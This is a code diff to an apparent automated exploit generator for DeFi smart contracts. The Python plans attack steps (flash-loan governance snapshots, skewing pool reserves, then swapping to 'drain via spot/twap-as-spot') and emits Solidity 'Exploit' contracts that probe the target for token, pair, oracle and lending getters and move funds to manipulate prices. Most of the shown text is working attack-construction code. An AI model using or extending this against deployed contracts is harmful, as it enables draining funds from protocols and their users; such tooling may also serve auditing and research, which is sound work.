@@ -119,11 +119,11 @@ def plan_world(
         steps.append(WorldStep("helper", "$gov", "snapshot", "inside flash callback"))
         steps.append(WorldStep("helper", "$gov", "queueAction", "privileged action"))
         reason_bits.append("flash → snapshot → queue (same tx, two contracts)")
-    if "dex_spot_swap" in feats or "spot_price" in feats:
+    if "dex_spot_swap" in feats or "spot_price" in feats or "twap_falls_to_spot" in feats:
         tokenish = [c for c in cs if c.kind in ("token", "pair", "router")]
-        if tokenish:
+        if tokenish or "sibling_getter" in feats:
             steps.append(WorldStep("attacker", "$pair", "sync_or_donate", "skew reserves"))
-            steps.append(WorldStep("attacker", "$router", "swap", "drain via spot price"))
+            steps.append(WorldStep("attacker", "$router", "swap", "drain via spot/twap-as-spot"))
             reason_bits.append("pair skew then router swap")
             cross = True
     if "execute_before_schedule" in feats:
@@ -153,21 +153,32 @@ def _fold_exploit(src, target_name, feats, cs, steps) -> str:
     """
     s = _strip_comments(src or "")
     getters = []
-    for c in cs:
-        if c.kind == "token":
-            getters.append('        try IT(t).token() returns (address tok) { token = tok; } catch {}')
-        if c.kind == "pair":
-            getters.append('        try IT(t).pair() returns (address p) { pair = p; } catch {}')
-        if c.kind == "router":
-            getters.append('        try IT(t).router() returns (address r) { router = r; } catch {}')
-    # also scan target for IERC20 public token
-    if re.search(r"(IERC20|ERC20|token)\s+(public\s+)?\w+", s):
-        m = re.search(r"(?:IERC20|ERC20)\s+(?:private\s+|public\s+|internal\s+)?(\w+)", s)
-        if m:
-            getters.append(f"        try IT(t).{m.group(1)}() returns (address tok) {{ token = tok; }} catch {{}}")
+    GETTERS = (
+        ("token", "token"),
+        ("token0", "token"),
+        ("token1", "token"),
+        ("pair", "pair"),
+        ("pool", "pair"),
+        ("router", "router"),
+        ("oracle", "oracle"),
+        ("factory", "router"),
+        ("asset", "token"),
+        ("collateral", "token"),
+        ("lending", "router"),
+    )
+    seen_fn = set()
+    for fn, slot in GETTERS:
+        if fn in seen_fn:
+            continue
+        if re.search(rf"function\s+{fn}\s*\(", s) or any(c.kind == slot for c in cs):
+            seen_fn.add(fn)
+            getters.append(
+                f"        try IT(t).{fn}() returns (address a) {{ "
+                f"if ({slot} == address(0)) {slot} = a; }} catch {{}}"
+            )
 
     body_lines = [
-        "        address token; address pair; address router;",
+        "        address token; address pair; address router; address oracle;",
         *getters,
     ]
     if "unpermissioned_callback" in feats:
@@ -191,9 +202,14 @@ def _fold_exploit(src, target_name, feats, cs, steps) -> str:
             "            if (b > 0) { try IERC20(token).transfer(t, b) {} catch {} }",
             "        }",
         ]
-    if "dex_spot_swap" in feats or "spot_price" in feats:
+    if (
+        "twap_oracle" in feats
+        or "twap_falls_to_spot" in feats
+        or "dex_spot_swap" in feats
+        or "spot_price" in feats
+    ):
         body_lines += [
-            "        // world: skew pair then swap. getters may be zero — try is best-effort.",
+            "        // world: skew pair then swap/borrow. getters may be zero — try is best-effort.",
             "        if (pair != address(0) && token != address(0)) {",
             "            uint256 b = IERC20(token).balanceOf(address(this));",
             "            if (b > 0) { try IERC20(token).transfer(pair, b) {} catch {} }",
@@ -206,8 +222,6 @@ def _fold_exploit(src, target_name, feats, cs, steps) -> str:
         "approve" in f.get("body", "") or re.search(r"\.call\s*\(", f.get("body", "")))), None)
     if cb:
         iface_extra += f"    function {cb['name']}(address,bytes calldata) external payable;\n"
-    if re.search(r"function\s+token\s*\(", s):
-        iface_extra += "    function token() external view returns (address);\n"
 
     return (
         HEADER
@@ -220,8 +234,16 @@ def _fold_exploit(src, target_name, feats, cs, steps) -> str:
         + "    function approve(address,uint256) external returns (bool);\n}\n"
         + "interface IT {\n"
         + "    function token() external view returns (address);\n"
+        + "    function token0() external view returns (address);\n"
+        + "    function token1() external view returns (address);\n"
         + "    function pair() external view returns (address);\n"
+        + "    function pool() external view returns (address);\n"
         + "    function router() external view returns (address);\n"
+        + "    function oracle() external view returns (address);\n"
+        + "    function factory() external view returns (address);\n"
+        + "    function asset() external view returns (address);\n"
+        + "    function collateral() external view returns (address);\n"
+        + "    function lending() external view returns (address);\n"
         + iface_extra
         + "}\n"
         + "contract Exploit {\n"
